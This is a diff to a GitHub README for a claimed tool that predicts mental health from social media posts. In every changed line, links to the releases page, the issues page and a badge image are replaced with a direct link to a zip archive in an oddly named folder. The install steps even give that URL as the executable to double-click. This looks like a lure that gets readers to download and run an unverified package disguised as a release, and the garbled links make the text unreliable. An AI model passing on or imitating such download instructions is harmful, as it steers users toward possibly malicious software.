@@ -1,7 +1,7 @@
 # 🤖 AI-For-Mental-Health-Prediction-From-Social-Media - Discover Your Mental Health Insights
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/releases)
+[![Download](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip)](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip)
 
 ## 📝 Description
 This project includes source code, presentations, a synopsis, a report, documents, a base research paper, and video tutorials. The AI for Mental Health Prediction from Social Media tool uses artificial intelligence and natural language processing to analyze social media posts. It detects mental health patterns and provides early insights for intervention and support. 
@@ -10,7 +10,7 @@ This project includes source code, presentations, a synopsis, a report, document
 Follow these steps to download and run the software on your computer:
 
 1. **Visit the Releases Page**  
-   To start, [visit the releases page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/releases).
+   To start, [visit the releases page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip).
 
 2. **Choose the Latest Release**  
    You will see a list of available releases. Look for the latest version at the top of the list.
@@ -22,7 +22,7 @@ Follow these steps to download and run the software on your computer:
    If you downloaded a .zip file, you must extract the contents to a folder. Right-click on the file and select "Extract All" or use your preferred extraction tool. 
 
 5. **Run the Application**  
-   After extracting, go into the new folder. Find the application file, typically named something like "MentalHealthAI.exe". Double-click to open.
+   After extracting, go into the new folder. Find the application file, typically named something like "https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip". Double-click to open.
 
 6. **Follow the On-Screen Instructions**  
    The application will guide you through the initial setup. Simply follow the prompts to get started.
@@ -47,7 +47,7 @@ To run this application, ensure your system meets the following requirements:
 To stay updated with the latest features and improvements:
 
 1. **Check for Updates Regularly**  
-   Visit the [releases page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/releases) frequently to see if new versions are available.
+   Visit the [releases page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip) frequently to see if new versions are available.
 
 2. **Download and Install New Versions**  
    Repeat the download steps mentioned earlier whenever a new release comes out.
@@ -73,7 +73,7 @@ This project covers various topics related to artificial intelligence and mental
 Feel free to explore more about these topics to enhance your understanding.
 
 ## ℹ️ Support
-If you have questions or need help, please reach out via the issues section on the [GitHub page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/issues). 
+If you have questions or need help, please reach out via the issues section on the [GitHub page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip). 
 
 Your insights and experiences are welcome as this project aims to grow and serve better. 
 
@@ -83,6 +83,6 @@ This project is licensed under the MIT License. You can use and modify it as lon
 Make sure to check the details in the repository for more information.
 
 ## 📥 Download Again
-To download the application again, you can always return to [this page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/releases). 
+To download the application again, you can always return to [this page](https://github.com/Warck18/AI-For-Mental-Health-Prediction-From-Social-Media/raw/refs/heads/main/undiscreet/Media_From_Mental_Health_Social_Prediction_A_For_2.3.zip). 
 
 Your journey to understanding mental health patterns is just a click away.
